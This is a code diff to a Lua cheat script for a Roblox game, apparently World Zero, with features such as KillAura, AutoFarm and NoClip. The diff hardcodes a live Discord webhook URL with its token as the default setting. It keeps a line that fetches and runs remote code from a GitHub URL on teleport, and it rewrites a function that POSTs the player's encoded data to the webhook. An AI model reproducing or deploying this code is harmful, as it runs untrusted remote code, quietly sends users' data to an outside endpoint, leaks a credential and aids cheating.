@@ -289,10 +289,10 @@ local al = {KillAura, PetSkill, AutoFarm, GetDrop, NoClip, InfJump, ReLoadOnHop,
             DelEgg, SellNonLegend, AutoSwitch, SellLegend, AiPing, MoLPass, MaxPerk, HPHalf, KlausDown}
 ag('WZ_Toggles', al)
 local am = {
-    Webhook = ''
+    Webhook = 'https://discord.com/api/webhooks/1249664506448187443/2me_mJp4i155tl1fayEFVaYIS-yzp9FNqQAGRyI1v4xe56MYdc8KDYBaA9Yw4Vevl3jw'
 }
 ag('WZwebhook', am)
-local an = syn and syn.queue_on_teleport and syn.request or fluxus and fluxus.queue_on_teleport or queue_on_teleport or http_request;
+local an = syn and syn.queue_on_teleport or fluxus and fluxus.queue_on_teleport or queue_on_teleport;
 local ao = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/maihoangphi2531/worldzero/main/test"))()'
 local ap = {
     DungeonID = a0[game.PlaceId],
@@ -3219,28 +3219,26 @@ for A, B in pairs(dc) do
         table.insert(dB, dC(M[A].DisplayKey, A, ai))
     end
 end
-getgenv().PlayerData = {
+getgenv().PlayerData = h:JSONEncode({
     ['content'] = '',
     ['embeds'] = {unpack(dB)}
-}
-
-local webhookUrl = "https://discord.com/api/webhooks/1249664506448187443/2me_mJp4i155tl1fayEFVaYIS-yzp9FNqQAGRyI1v4xe56MYdc8KDYBaA9Yw4Vevl3jw"
-
-local function sendWebhook(url, payload)
-    local requestFunction = http_request or request or HttpPost or syn.request
-    if requestFunction then
-        requestFunction({
-            Url = url,
-            Body = game:GetService('HttpService'):JSONEncode(payload),
+})
+local function dG(dH, dI)
+    if dH:match("https://discord.com/api/webhooks/%d.*/%w*") then
+        local dJ = dH;
+        local dK = PlayerData;
+        local dL = {
+            ["content-type"] = "application/json"
+        }
+        request = syn and syn.request or http_request;
+        request({
+            Url = dJ,
+            Body = dK,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            }
+            Headers = dL
         })
     else
-        warn("Không tìm thấy hàm yêu cầu phù hợp")
+        warn("Something went wrong")
     end
 end
-
-sendWebhook(webhookUrl, PlayerData)
-
+dG(am.Webhook, PlayerData)
